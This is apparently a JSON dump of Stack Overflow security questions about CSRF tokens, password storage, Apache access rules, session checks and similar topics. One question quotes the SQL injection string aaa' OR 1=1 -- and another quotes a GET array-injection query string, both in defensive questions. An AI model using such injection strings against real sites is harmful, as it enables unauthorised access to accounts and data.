\"&lt;myRequest&gt;&lt;content&gt;Some content&lt;/content&gt;&lt;/myRequest&gt;\";\nvar request = new XMLHttpRequest();\nrequest.open(\"POST\", serviceUrl, true); // &lt;-- This fails in Mozilla Firefox amongst other browsers\nrequest.setRequestHeader(\"Content-type\", \"text/xml\");\nrequest.send(payload);\n</code></pre>\n\n<p>How can I have this work in other browsers beside Internet Explorer? </p>\n"},{"tags":["django","security"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12127290,"title":"Suspicious HTTP GET with nonexistent ID","body":"<p>Recently there have been many GET connections to my server with strange ID. Basically, my server is built with Django. And I have artciles  as a class with the following mapping url:</p>\n\n<p><a href=\"http://myserver.com/writing/\" rel=\"nofollow\">http://myserver.com/writing/</a>{id}</p>\n\n<p>Now the following list is an example of the suspicious GET connections:</p>\n\n<p><a href=\"http://myserver.com/writing/13443214\" rel=\"nofollow\">http://myserver.com/writing/13443214</a></p>\n\n<p><a href=\"http://myserver.com/writing/13443215\" rel=\"nofollow\">http://myserver.com/writing/13443215</a></p>\n\n<p><a href=\"http://myserver.com/writing/13443216\" rel=\"nofollow\">http://myserver.com/writing/13443216</a></p>\n\n<p><a href=\"http://myserver.com/writing/13445214\" rel=\"nofollow\">http://myserver.com/writing/13445214</a></p>\n\n<p><a href=\"http://myserver.com/writing/13473214\" rel=\"nofollow\">http://myserver.com/writing/13473214</a></p>\n\n<p>The problem is I don't have those id in my database.</p>\n\n<p>there have been any problems so far but it made me worry.</p>\n\n<p>I can't trace back from where these connections come.</p>\n\n<p>What is your thought on this?</p>\n"},{"tags":["php","mysql","database","security"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":76,"score":0,"question_id":12126482,"title":"How storing database info outside webroot of php applications will improve security","body":"<p>I have seen many recent php script open-source applications ( forums, cms, etc) for which the database info is stored in a separate php file but (unfortunately) inside the webroot. Now I am about to make a choice as to what script to go for, and therefore need to know how this neglect wold affect the security of my db? \nIn fact I don't know how much, and what way, we could improve the security of our d by just moving the dbconfig.php to a separate directory? </p>\n\n<p>I have already looked at this thread too:<a href=\"http://stackoverflow.com/questions/97984/how-to-secure-database-passwords-in-php\">How to secure database passwords in PHP?</a></p>\n\n<p>Okay, just now I found this thread <a href=\"http://stackoverflow.com/questions/11181675/mysql-php-is-this-a-secure-way-to-connect-to-mysql-db\">mysql/php is this a secure way to connect to mysql DB</a>and would like to make my question even more clear:\nwhich one of these places is more secure to keep my dbconfig.php and why?</p>\n\n<pre><code> 1./dbconfig.php \n 2./public_html/dbconfig.php\n 3./public_html/includes/dbconfig.php\n</code></pre>\n\n<p>suppose that the file index file is located here (I guess is referred aswebroot):</p>\n\n<pre><code>/public_html/index.php ( which first needs to include the dbconfig.php)\n</code></pre>\n"},{"tags":["linux","security","ubuntu","sed","input-history"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":332,"score":1,"question_id":7183801,"title":"script or one-liner to clean up passwords in .bash_history","body":"<p>I sometimes mistakenly type my su password in a linux terminal that is echoing the typed characters. It gets recorded in <code>~/.bash_history</code> which makes me feel insecure. Does anyone have a short script (bash one-liner?) to clean <code>.bash_history</code> of any plain text passwords? </p>\n\n<p>Using sed leaves it's own traces in the .bash_history file, but if readline and/or history service could be temporarily disabled this might work:</p>\n\n<pre><code>sed -ir -e 's/su_password/PASSWORD_REMOVED/g' ~/.bash_history\n</code></pre>\n\n<p>And this could create additional problems/holes if the password is often used as part of other phrases/words. </p>\n\n<p>Ideally, the script should just peruse the hashed passwd list (<code>/etc/shadow</code>) to create a list of search terms. Then it would have to hash portions of the file it's checking (<code>.bash_history</code>) for comparison. The problem is knowing how much of the text in the file to hash during the comparison as the length of the password is unknown. Alternatively, it could request the password in a secure way, like passwd does, before doing the grep/sed.</p>\n"},{"tags":["security","encryption"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":47,"score":1,"question_id":12104811,"title":"Encryption algorithm in 4k memory","body":"<p>i am working in some devices (hardware) for domotic aplications, now i need to implement an algorithm to avoid intruders in my network deploy by the devices, the only restriction i have is that the memory in each device is 4k, any suggestion that i can implement??</p>\n"},{"tags":["database","security","passwords"],"answer_count":9,"favorite_count":46,"up_vote_count":68,"down_vote_count":0,"view_count":27401,"score":68,"question_id":1054022,"title":"Best way to store password in database","body":"<p>I am working on a project that has to have authentication  (user name/pass)</p>\n\n<p>It also connects to a database so i figured i would store the user name and password there but it seems like not such a good idea to have passwords as just a text field in a table sitting on the db</p>\n\n<p>I'm using C# and connecting to a 2008 express server. can anyone suggest ( with as many examples as possible) what is the best way to store this type of data?</p>\n\n<p>(i am open to the idea that this info not be stored in the db if a good reason can be provided)</p>\n"},{"tags":["php","security","xampp"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":65,"score":0,"question_id":12125573,"title":"why am I connecting to static7.superfish.com?","body":"<p>Don't actually know what can be the right title for this, but when I'm working on my testing server on XAMPP, there is request now and then to static7.superfish.com...?</p>\n\n<p>I'm playing around with embedding youtube videos and thumbnails and as far as I know that domain has nothing to do with YouTube, is that site leeching my bandwith, is it a virus or are they hacking my testing server? If it is some leeching or otherwise unwanted connection to my testing server, how can I prevent it? </p>\n"},{"tags":["security","visual-studio-2012","windowsauthentication"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":900,"score":1,"question_id":12042144,"title":"IIS express applicationhost.config security is reset every time a solutions is opened in VS2012","body":"<p>I have an MVC4 application been developed in VS2012 that uses forms authentication.</p>\n\n<pre>\n[authentication mode=\"Forms\"]\n  [forms loginUrl=\"~/Account/Login\" timeout=\"2880\" /]\n[/authentication]\n</pre>\n\n<p>It's using the default IIS 8.0 Express.</p>\n\n<p>Every time I open and run the app from within the VS I got the message:</p>\n\n<blockquote>\n  <p>HTTP Error 401.2 - Unauthorized</p>\n  \n  <p>You are not authorized to view this page due to invalid authentication headers.</p>\n</blockquote>\n\n<p>I found out that to avoid this screen I have to change to 'true' the anonymousAuthentication and windowsAuthentication keys of the  Security section of the applicationhost.config file at the [User Documents]\\IISExpress\\config folder to:</p>\n\n<pre>\n[system.webServer]\n  [security]\n    [authentication]\n      [anonymousAuthentication enabled=\"true\" /]\n      [windowsAuthentication enabled=\"true\" /]\n    [/authentication]\n  [/security]\n[/system.webServer]\n</pre>\n\n<p>But every time I reopen the solution in VS the keys are reset to false.</p>\n\n<p>How can I make then permanently set to true?</p>\n\n<p>I've tried to put those key in the application's web.config but then I receive the message:</p>\n\n<blockquote>\n  <p>HTTP Error 500.19 - Internal Server Error</p>\n  \n  <p>The requested page cannot be accessed because the related configuration data for the page is invalid.</p>\n</blockquote>\n\n<p>Any help folks?</p>\n"},{"tags":["android","security","encryption","documents"],"answer_count":5,"favorite_count":3,"up_vote_count":6,"down_vote_count":0,"view_count":198,"score":6,"question_id":11981805,"title":"Android how to secure contents in document directory","body":"<p>I am asking the same question as here: </p>\n\n<ul>\n<li><a href=\"http://stackoverflow.com/questions/7471270/secure-contents-in-document-directory\">Secure contents in document directory</a></li>\n</ul>\n\n<p>For android.</p>\n\n<p>Are there equivalent concepts in android to what is presented here:</p>\n\n<ul>\n<li><a href=\"http://stackoverflow.com/questions/4595955/protecting-the-app-sandbox\">Protecting the app sandbox</a></li>\n</ul>\n\n<p>My particular requirement is to protect files from rooted devices and also make them available only through application and for a certain lifetime.</p>\n\n<p>Thanks</p>\n"},{"tags":["git","security","github"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12102515,"title":"Storing or not storing specific line in file on github","body":"<p>I have various scripts that I would like to make available to several other people to use with their own accounts. I keep these scripts in a github repo.</p>\n\n<p>Let's say I have a bash script to ssh into computer via: </p>\n\n<pre><code>username=crzyuser123\nssh -XY $username@specialcomputer.com\n</code></pre>\n\n<p>Now I'm not crazy, I don't store my password (using rsa pub/private keys) in the script, but let's say that it's a very handy script that I use and update all the time, and other people also use all the time (but they clearly have a different <strong>username</strong>). </p>\n\n<p>What I'd like to be able to do is say, \"git pull, then edit this one line in the file so that your username is there, then forget it!\"  And each time they git pull to update their repo, it leaves that line unchanged. </p>\n\n<p>They could, of course, update this one line every time they update the repo, but that seems to be a huge pain. I also need to convey any solution in not-too-difficult way.</p>\n\n<p>What's the best practice to making this situation easiest for all involved?</p>\n"},{"tags":["security","email-client","password-encryption"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12122346,"title":"Store email account's password","body":"<p>I'm developing an email client in PHP for IMAP accounts. Which would be the most secure way to store the account's password being able to retrieve it afterward to check emails?</p>\n\n<p>I guess I should encrypt it somehow. However, how can I make sure that only my app will be able to decrypt it?</p>\n"},{"tags":["security","iis","native","httpmodule","x-sendfile"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12121839,"title":"I need advice on implementing X-Sendfile and X-Accel-Redirect as a native HttpModule for IIS","body":"<p>I'm thinking of implementing X-Sendfile and X-Accel-Redirect as a native HttpModule for IIS by checking for the relevant header and calling SetPhysicalPath in the OnMapPath method when appropriate.</p>\n\n<p>The problem is, I'm not sure when OnMapPath is called during the request pipeline, and I'm not sure whether SetPhysicalPath here will force IIS to simply serve the static file at the provided path, regardless of whether ASP.NET already started a response.</p>\n\n<p>The other problem is making sure the module can't be abused by application developers: I still want the new file path to be subject to the same restrictions as the application that handled the response (and added the sendfile header) originally.</p>\n\n<p>Can anyone shed some light on these questions?</p>\n"},{"tags":["php","mysql","sql","security","sql-injection"],"answer_count":5,"favorite_count":14,"up_vote_count":16,"down_vote_count":0,"view_count":4579,"score":16,"question_id":5741187,"title":"SQL injection that gets around mysql_real_escape_string()","body":"<p>Is there an SQL injection possibility even when using mysql_real_escape_string() function?</p>\n\n<p>Consider this sample situation. SQL is constructed in PHP like this:</p>\n\n<pre><code>$login = mysql_real_escape_string(GetFromPost('login'));\n$password = mysql_real_escape_string(GetFromPost('password'));\n\n$sql = \"SELECT * FROM table WHERE login='$login' AND password='$password'\";\n</code></pre>\n\n<p>I have heard numerous people say to me that a code like that is still dangerous and possible to hack even with mysql_real_escape_string() function used. But I cannot think of any possible exploit?</p>\n\n<p>Classic injections like this:</p>\n\n<pre><code>aaa' OR 1=1 --\n</code></pre>\n\n<p>do not work.</p>\n\n<p>Do you know of any possible injection that would get through the PHP code above?</p>\n"},{"tags":["security","http","jsp","authorization"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":109,"score":0,"question_id":8570701,"title":"Hot to define a web.xml role-name in a web project","body":"<p>I'm developing a Web Project with JEE and I want that some JSP are accessible only by some kind of users. I've read that using the web.xml descriptor I can set the visibility of some resources only to a 'role-name'. But how do I set this role-name in the http session?<br>\nFor instance, my descriptor has:</p>\n\n<pre><code>  &lt;security-constraint&gt;\n    &lt;web-resource-collection&gt;\n      &lt;web-resource-name&gt;Access to Student pages&lt;/web-resource-name&gt;\n      &lt;url-pattern&gt;/Student/*&lt;/url-pattern&gt;\n    &lt;/web-resource-collection&gt;\n    &lt;auth-constraint&gt;\n      &lt;role-name&gt;Student&lt;/role-name&gt;\n    &lt;/auth-constraint&gt;\n  &lt;/security-constraint&gt;\n</code></pre>\n\n<p>Where/How do I define the 'Student' role-name?</p>\n"},{"tags":["ruby-on-rails","ruby","security","mass-assignment","strong-parameters"],"answer_count":4,"favorite_count":2,"up_vote_count":9,"down_vote_count":0,"view_count":835,"score":9,"question_id":7483451,"title":"Why slicing the params hash poses a security issue on mass-assignment?","body":"<p>The official Rails-way of preventing security risks on mass-assignment is using <a href=\"http://api.rubyonrails.org/classes/ActiveModel/MassAssignmentSecurity/ClassMethods.html\" rel=\"nofollow\">attr_accessible</a>. However, some programmers feel this is not a job for the model but for the controller. The most simple way of doing it in a controller is slicing the <em>params</em> hash:</p>\n\n<pre><code>@user = User.update_attributes(params[:user].slice(:name))\n</code></pre>\n\n<p>But the documentation states: </p>\n\n<blockquote>\n  <p>Note that using Hash#except or Hash#slice in place of attr_accessible\n  to sanitize attributes wont provide sufficient protection.</p>\n</blockquote>\n\n<p>Why is it that? why a whitelist-slicing of the <em>params</em> hash is not enough?</p>\n\n<p>EDIT: <a href=\"http://weblog.rubyonrails.org/2012/3/21/strong-parameters/\" rel=\"nofollow\">Rails 4.0 will ship strong-parameters</a>, a refined slicing of parameters, so I guess the whole slice idea was not so bad after all.</p>\n"},{"tags":["php","security","escaping"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12118771,"title":"Escaping Form Data","body":"<p>I'm having a bit of a problem with escaping data, or at least, the cleanliness of the code involved with it.</p>\n\n<p>Let's say, I'm escaping a textfield named \"FirstName\" and it looks something like this:</p>\n\n<pre><code>$FirstName = mysqli_real_escape_string($link, $_POST['FirstName']);\n$FirstName = preg_replace( \"/[&lt;&gt;#$%]/\", \"\", $FirstName);\n$FirstName = preg_replace('/\\s\\s+/', ' ', $FirstName);\n</code></pre>\n\n<p>Is there anyway I can just put the last 2 lines in some sort of loop, let's say like this:</p>\n\n<pre><code>foreach($_POST as $name =&gt; $value)\n{\n    $value = preg_replace( \"/[&lt;&gt;#$%]/\", \"\", $value);\n    $value = preg_replace('/\\s\\s+/', ' ', $value);\n}\n</code></pre>\n\n<p>where then all I have to do later is </p>\n\n<pre><code>$FirstName = mysqli_real_escape_string($link, $_POST['FirstName']);\n</code></pre>\n\n<p>where $_POST['FirstName'] has already been stripped of the other characters?</p>\n"},{"tags":["security","static","flask","password-protection"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":60,"score":2,"question_id":12118355,"title":"Secure static files with flask","body":"<p>I am building a flask application, and I want it to serve some static files only if the user is authenticated. It's a very low-traffic application (for internal use only). How would I go about this? One thing I was thinking of is using serve_static(), and putting that behind an authentication check but that uses the static directory which flask already serves content from.</p>\n"},{"tags":["php","security","csrf"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":85,"score":1,"question_id":12118170,"title":"Best ways to protect against CSRF attacks in PHP","body":"<p>What is the best way to protect again <code>CSRF</code> attacks in PHP.</p>\n\n<p>It has been recommend to use form tokens, so basically generate a random value and store it in a hidden field. Then also store this random value in the users session.</p>\n\n<p>Finally in the form action, make sure the session and form token match.</p>\n\n<pre><code>if($_SESSION['token'] !== $_POST['token']) {\n   die(\"bad... spanking...\");\n}\n</code></pre>\n\n<p>Is there a better/easier way, as this requires a lot of code modification in my application (lots of forms and actions).</p>\n"},{"tags":["php","security","session","session-fixation"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":230,"score":1,"question_id":5289925,"title":"PHP Sessions - checking pevious IP on every page load - To do, or alternatives?","body":"<p>Right now I have this implemented in my Dev environment:</p>\n\n<ul>\n<li>I store the $SERVER['REMOTE_ADDR'] as a session variable upon login, then recheck the page every page load for the same IP address.</li>\n</ul>\n\n<p>The more I read, I see that many people don't like this idea because of proxy's etc...  So, what are some other options that can still be good practce?  I was thinking about USER AGENT - but any joe-blow can fake that with a simple firefox plugin.  That said, at least it would take a good guess from an attacker to successfully pick the right one on the first try...</p>\n\n<p>What do people think?  I'd love to simply just change out the text: 'SERVER_ADDR' with something else - all the other code can remain as is.</p>\n\n<p>Thanks.</p>\n\n<p><strong>EDIT:</strong>\nI guess my main goal here is to prevent hijacking/fixation.  An IP check would in theory ensure that the user remains the user at all times (well, unless somebody's spoofing the IP also...) - but the session is basically saved to an IP address in this manor...</p>\n"},{"tags":["php","ajax","security","injection"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":55,"score":-1,"question_id":12117742,"title":"how do i write literally two words on a file and avoid data injection?","body":"<p>the problem is simple. i made a small HTML5 game and since some of my friends got pretty excited with it i wanted to build a hall of fame. the idea would just be a simple csv, like</p>\n\n<pre><code>Name,Points,Date\nAAA,15,2012-08-25\n</code></pre>\n\n<p>etc.; how do i do this? my idea was to send things with an ajax request to a php file which in turn parses and writes to the csv, but i can't really imagine how to send data to the php file without it being noticed (allowing people to input fake scores).</p>\n\n<p>also, this has to be super simple, so, no node.js, etc.</p>\n"},{"tags":["php","security","arrays","get","exploit"],"answer_count":7,"favorite_count":1,"up_vote_count":6,"down_vote_count":0,"view_count":2735,"score":6,"question_id":1885979,"title":"PHP GET variable array injection","body":"<p>I've recently learned that it's possible to inject arrays into PHP GET variables to perform code execution?</p>\n\n<p><code>.php?a[]=asd&amp;a[]=asdasd&amp;b[]=$a</code></p>\n\n<p>That was the example I was given. I have no idea how it works and was wondering if this is even possible?</p>\n"},{"tags":["security","apache","webserver"],"answer_count":2,"favorite_count":1,"up_vote_count":6,"down_vote_count":0,"view_count":1146,"score":6,"question_id":6243677,"title":"Apache - How to deny directory but allow one file in that dirctory","body":"<p>I try to configure my Apache .conf file to deny listing from a certain category, but I want to allow a specific file inside this category.\nIt appears that the Directory rule is \"stronger\" than the Files rule, so when using both - I can't access that certain file.</p>\n\n<p>This is what I try:</p>\n\n<pre><code>&lt;Directory /var/www/denied_directory&gt;\n     order deny,allow\n     Deny From All\n&lt;/Directory&gt;\n\n&lt;Files safefile.php&gt;\n    Order Allow,Deny\n    Allow from All\n&lt;/Files&gt;\n</code></pre>\n\n<p>I would appreciate your help.\nThanks!</p>\n"},{"tags":["facebook","security","https","tabs","browsing"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":93,"score":1,"question_id":12074968,"title":"facebook tab default http over https","body":"<p>I know this kind of question are asked all the time,\nI've mannaged to deal with all the https problems and all that..\nbut my problem now is when a user click on the app tab in my page, and their secure browsing option is disabled, they automatically redirected to the http url insted of the https. (my app can only work throu https).</p>\n\n<p>I tried not putting anything in Page Tab URL: in the app settings as well as putting the https url there, but they both wont work...</p>\n\n<p>how can I make my tab to default redirect to https url??</p>\n\n<p>thanks</p>\n\n<p>p.s.\nI've also tried redirecting by code like this:</p>\n\n<pre><code>if($_SERVER['HTTPS']!=on)\n{\n   $redirect= https://.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];\n   header(Location:$redirect);\n}\n</code></pre>\n\n<p>and also like that:</p>\n\n<pre><code>if (!$_SERVER['HTTPS']) {\n  header(\"HTTP/1.1 301 Moved Permanently\");\n  header('Location: https://[myappurl]');\n  exit;\n}\n</code></pre>\n\n<p>but it did not work</p>\n\n<p><strong>update: problem solved</strong><br>\nI needed to fill up the app on facebook section on my application setting in facebook developer. I'm not sure why, but it worked.</p>\n"},{"tags":["android","security"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":64,"score":1,"question_id":12114739,"title":"Implement Login in Android","body":"<p>I'm trying to make an app where the user must log in with a name/pass combo. However, I'm not entirely sure where to check if the username/pass is valid.</p>\n\n<p>Each time the app is run, should I refresh my copy of the database on the phone before showing the login screen? Or should I pull only after I've validated the login info (via a post sent over https?).</p>\n\n<p>Also I'm wondering about the security of storing a part of the database that contains the username/password combos on the phone. If I hash the password repeatedly with a salt, is there a chance the username/password combo could be viewed easily? What hash algorithm is appropriate? (md5 is weak I've read, as is sha-1, but maybe with repeated iteration it could mitigate sha-1 weaknesses?). </p>\n"},{"tags":["java","security","struts","token"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1160,"score":0,"question_id":1475061,"title":"Struts Synchronizer Token","body":"<p>If I implement the <a href=\"http://www.corej2eepatterns.com/Design/PresoDesign.htm\" rel=\"nofollow\">Synchronizer Token</a> in my struts application, would i need to edit all my forms to add some kind of tag for the token or is that done automatically by struts?</p>\n"},{"tags":["c#",".net","security",".net-4.0","permissions"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":100,"score":0,"question_id":12112512,"title":".NET 4.0 - \"SecurityAction.RequestMinimum is obsolete\"","body":"<p>In my code I am recieving warnings about these two lines:</p>\n\n<pre><code>[assembly:SecurityPermissionAttribute(SecurityAction.RequestMinimum, UnmanagedCode=true)]\n[assembly:PermissionSetAttribute(SecurityAction.RequestMinimum, Name = \"FullTrust\")]\n</code></pre>\n\n<p>These are the warnings:</p>\n\n<pre><code>S:\\Nimrod\\src\\WinUI\\Components\\Syncfusion.Grid\\AssemblyInfo.cs(38,39): warning CS0618: 'System.Security.Permissions.SecurityAction.RequestMinimum' is obsolete: 'Assembly level declarative security is obsolete and is no longer enforced by the CLR by default. See http://go.microsoft.com/fwlink/?LinkID=155570 for more information.'\nS:\\Nimrod\\src\\WinUI\\Components\\Syncfusion.Grid\\AssemblyInfo.cs(39,34): warning CS0618: 'System.Security.Permissions.SecurityAction.RequestMinimum' is obsolete: 'Assembly level declarative security is obsolete and is no longer enforced by the CLR by default. See http://go.microsoft.com/fwlink/?LinkID=155570 for more information.'\n</code></pre>\n\n<p>I checked out the link mentioned in the warning messages but it isn't quite clear on how to deal with migrating past the obsolete methods. This other question <a href=\"http://stackoverflow.com/questions/11625447/securityaction-requestminimum-is-obsolete-in-net-4-0\">here</a> suggests that I should just delete them, but I'm skeptical of that solution, I believe I should have to replace them with something not just outright delete them.</p>\n\n<p>How should I proceed?</p>\n"},{"tags":["flex","security"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":87,"score":0,"question_id":12111639,"title":"Flex Security.loadPolicyFile()","body":"<p>I have a flex application which connects to multiple database instances. Before I can connect, I need to obtain the crossdomain.xml file. I have a simple perl script which retrieves the connection and sends the policy file. Currently, my line of code in Flex which connects to the policy file server looks like that:</p>\n\n<pre><code>Security.loadPolicyFile(\"xmlsocket://\" + host + \":20000\")\n</code></pre>\n\n<p>Where host is a variable specified by user (IP of the server where the database is hosted).\nThis requires me to run the socket policy file script on every server where the database is hosted (there are multiple instances). Can I just run it on one server, and default the host like that:</p>\n\n<pre><code>Security.loadPolicyFile(\"xmlsocket://oneDBserver:2000\")\n</code></pre>\n\n<p>Or do I need to run the script on every DB server?</p>\n"},{"tags":["asp.net","security","architecture","n-tier"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":61,"score":1,"question_id":12107310,"title":"ASP.Net applications splitted in different tier","body":"<p>I'm dealing with an architecture approach that doesn't convince me deeply, but I can't figure out a good alternative.\nBasically our company is pretty much always under attack... I mean there's constant attempt of phishing, spoofing, bruteforcing, etc. attacks to our public web site.\nDecision has been taken to delpoy the web apps on a 3 tier configuration (I really mean tier, not layer as often they're confused), letting the presentation tier being on a machine, in a subnet exposed to the internet, and the rest of the application being on an internal subnet, with an application server that basically expose everything needed by the presentation server or other internal system, and obvioulsy a database server.</p>\n\n<p>Now, the separation between presentation and business logic, is very heavy both in terms of development and in terms of performance: use a DLL dedicated to perform data access is obviuosly faster than call a remote service to perform the same operation.</p>\n\n<p>This, on the other, has been seen as the most pratical way to improve security: in this deployment model the presentation layer could be break throug by some hacker, but still, from there, they gain no access to the database, and that's the important part.</p>\n\n<p>The communication between the presentation tier and the business tier is made through WCF services, exposing authenticated SOAP methods.</p>\n\n<p>Moreover the approach is to let all the business logic in the BL tier, letting the presentation tier be quite \"stupid\": so the BL tier is not merely a secured DAL layer, but contains all the logic.</p>\n\n<p>Is that an acceptable approach? There's some smarter way to handle such scenario out there, that we're missing? Would you prefer to keep BL on the presentiation tier, living just the DAL in the middle tier? And for what reason?\nI'm feeling pretty unsure about our solution, so I'm asking for any advice.</p>\n"},{"tags":["security","browser","website"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":19,"score":1,"question_id":12110663,"title":"Wappalyzer selling datasets - possible website security implications?","body":"<p><strong>NOTE</strong>: As I wanted this more to be a discussion, I wasn't sure on which SE website to place it. If you are a moderator, please move this to appropriate website if it doesn't fit here.</p>\n\n<hr>\n\n<p>Hello everyone,</p>\n\n<p>I am using <a href=\"http://wappalyzer.com\" rel=\"nofollow\">Wappalyzer</a> everyday as it provides me with some interesting data about the websites I visit.</p>\n\n<p>Today I noticed that they actually sell full datasets/lists of sites using certain technology. You can see an example <a href=\"http://wappalyzer.com/applications/WordPress\" rel=\"nofollow\">here</a>:</p>\n\n<blockquote>\n  <p>The full list of 825,070 websites using WordPress costs US $1,575</p>\n</blockquote>\n\n<p>Now, I know that most of those toolbar additions to your browsers actually collect information on the sites you visit and use them later on for statistics and other purposes (Alexa, visit count websites etc.). But the fact that these guys were actually selling it openly on their site, sounded almost as if someone would sell your email address publicly.</p>\n\n<p><strong>What am I aiming at?</strong></p>\n\n<p>Well, for $1,575 someone could get a really good base for doing some nasty things. They could hit all those websites and check the core versions and let's say plugins they use. After that they could filter the older ones and perform a series of attacks to infect visitors and spread out whatever they want.</p>\n\n<p>The fact that an attacker would be able to get such huge already filtered list of websites, without <em>any</em> effort is what makes me question if this should be allowed to be done.</p>\n\n<p><strong>My questions are:</strong></p>\n\n<ol>\n<li><p>Is this legal?</p></li>\n<li><p>What do you think about it?</p></li>\n<li><p>Is selling website data widely done on the net?</p></li>\n</ol>\n\n<p>I am asking more because of curiosity than getting really concerned. Having read that on their site made me feel it was not something completely normal.</p>\n\n<p>If I'm wrong in something - please explain.</p>\n\n<p>Thank you!</p>\n"},{"tags":["php","security","usability","csrf","csrf-protection"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":62,"score":-1,"question_id":12110382,"title":"CSRF protection and usability","body":"<p>Between most strong CSRF protection, there is the form token protection. The question I have about this method, is about usability: if a user opens multiple page containing a form, which use the the token, are generated multiple token, but only the last opened page can successful send the form, all the other will give error.</p>\n\n<p>I thought 2 solutions:</p>\n\n<ol>\n<li>Keep a unique token for all the duration of session.</li>\n<li>Store all generated tokens in session.</li>\n</ol>\n\n<p>But:</p>\n\n<ol>\n<li>This is the more realistic solution, but is less safe.</li>\n<li>This generate a large resource overhead, because a user could open many pages, and I must store all the generated token.</li>\n</ol>\n\n<p>Therefore, how have you solved this question?</p>\n\n<p>PS The website I'm developing, is practically a ecommerce in PHP and although the money transfer will be managed through an external provider (like paypal), I think right give a good safety to my service.</p>\n"},{"tags":["spring","security","annotations","shiro"],"answer_count":1,"favorite_count":2,"up_vote_count":25,"down_vote_count":0,"view_count":639,"score":25,"question_id":6842616,"title":"Can I use expressions in Apache Shiro security annotations?","body":"<p>I've been doing some comparisons between Apache Shiro and Spring Security - I'm really loving the security model that Shiro uses and believe it to be far cleaner that Spring Security.</p>\n\n<p>However, one big nice-to-have would be to be able to reference method parameters from within the method-level security annotations. For example, right now I could so something like:</p>\n\n<pre><code>@RequiresPermissions(\"account:send:*\")\npublic void sendEmail( EmailAccount account, String to, String subject, String message) { ... }\n</code></pre>\n\n<p>Within the context of this example, this means that the authenticated user must have the permission to send emails on email accounts.</p>\n\n<p>However, this is not fine-grained enough, as I want instance level permissions! In this context, assume that users can have permissions on instances of email accounts. So, I'd like to write the previous code something like this:</p>\n\n<pre><code>@RequiresPermissions(\"account:send:${account.id}\")\npublic void sendEmail( EmailAccount account, String to, String subject, String message) { ... }\n</code></pre>\n\n<p>In this way, the permission string is referencing a parameter passed into the method such that the method can be secured against a particular instance of EmailAccount.</p>\n\n<p>I know I could easily do this from plain Java code within the method, but it would be great to achieve the same thing using annotations - I know Spring Security supports Spring EL expressions in its annotations.</p>\n\n<p>Is this definitely not a feature of Shiro and thus will I have to write my own custom annotations?</p>\n\n<p>Thanks,</p>\n\n<p>Andrew</p>\n"},{"tags":["javascript","security","variables"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12108916,"title":"about Javascript security to random nummber from 1-1,000,000","body":"<pre><code>var r = Math.floor(Math.random()*(1000000-1+1))+1;\n$(\"code\").html(r);\n\nif (r == 5) {\n    alert(\"you win !\")\n}\n</code></pre>\n\n<p>Can someone change the variable by using Firebug or another program?</p>\n\n<p>If they can, how can I prevent this?</p>\n\n<p><a href=\"http://jsfiddle.net/SKRZd/\" rel=\"nofollow\">fiddle</a></p>\n"},{"tags":["security","browser","privacy"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":56,"score":0,"question_id":12106853,"title":"Which web browser does not send my privacy information to the websites I am visiting?","body":"<p>I want to be completely anonymous to the website that I am visiting. </p>\n\n<p>I have read on various blogs that a browser can send my location, MAC address and various other identification of my computer while visiting a website, without my permission. </p>\n\n<p>Is it possible for Google with its smart engineers to somehow pin point my computer from which I had previously done a transaction on Google Checkout. May be, through MAC address or some other magic of Google with its Google Chrome.</p>\n\n<p>Is there any web browser available which sends minimal personal information to the website?</p>\n"},{"tags":[".net","security"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":278,"score":1,"question_id":5156352,"title":"makecert for 2048 bits","body":"<p>For my application i need to generate a certificate with 2048 bits. Is it possible to generate using 'makecert.exe' tool? If not which tool can be used to generate the certificate?</p>\n"},{"tags":[".net","security","wif"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":254,"score":0,"question_id":4211674,"title":"Windows Identity Foundation Active Authentication","body":"<p>Maybe I'm going about this all wrong, but I'd like to take our Roles based ASP .NET Forms Authentication and port it to WIF so as to support federation with other applications.</p>\n\n<p>I know this is a broad question, but how can I do Forms Authentication with WIF? Is this even a valid question or am I misunderstanding something? All the examples I've seen involve AD and STS. We don't even want to start hosting an STS server yet, but simply to structure the code in a claims based model so that we can pursue federated security going forward.</p>\n\n<p>Any 